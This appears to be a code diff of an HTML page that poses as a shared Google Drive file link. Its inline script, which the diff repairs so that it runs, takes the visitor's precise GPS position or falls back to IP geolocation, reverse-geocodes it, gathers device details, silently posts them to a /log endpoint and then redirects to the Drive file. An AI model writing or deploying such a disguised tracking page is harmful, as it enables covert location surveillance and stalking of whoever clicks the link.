@@ -1,7 +1,7 @@
 
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8"><title>shared content info</title></head>
+<head><meta charset="UTF-8"><title>Tracker</title></head>
 <body>
 <script>
   async function getIPInfo() {
@@ -24,24 +24,24 @@
     };
 
     try {
-      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {{enableHighAccuracy:true,timeout:5000}}));
+      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true,timeout:5000}));
       method = "GPS"; lat = pos.coords.latitude; lon = pos.coords.longitude;
       address = await reverseGeocode(lat, lon);
-    } catch {{
+    } catch {
       const ipInfo = await getIPInfo();
       ip = ipInfo.ip; city = ipInfo.city; region = ipInfo.region; country = ipInfo.country_name;
       lat = ipInfo.latitude; lon = ipInfo.longitude;
-      address = `${{city}}, ${{region}}, ${{country}}`;
-    }}
+      address = `${city}, ${region}, ${country}`;
+    }
 
-    const payload = {{ method, latitude: lat, longitude: lon, address, city, region, country, ip, ...device }};
-    await fetch("/log", {{
+    const payload = { method, latitude: lat, longitude: lon, address, city, region, country, ip, ...device };
+    fetch("/log", {
       method: "POST",
-      headers: {{"Content-Type":"application/json"}},
+      headers: {"Content-Type":"application/json"},
       body: JSON.stringify(payload)
-    }});
-
-    window.location.href = "https://drive.google.com/file/d/13_1GoeLK1uPhoRCeBUM7OwC00sTfNrXF/view?usp=sharing";
+    }).finally(() => {
+      location.href = "https://drive.google.com/file/d/13_1GoeLK1uPhoRCeBUM7OwC00sTfNrXF/view?usp=sharing";
+    });
   }
 
   collectData();
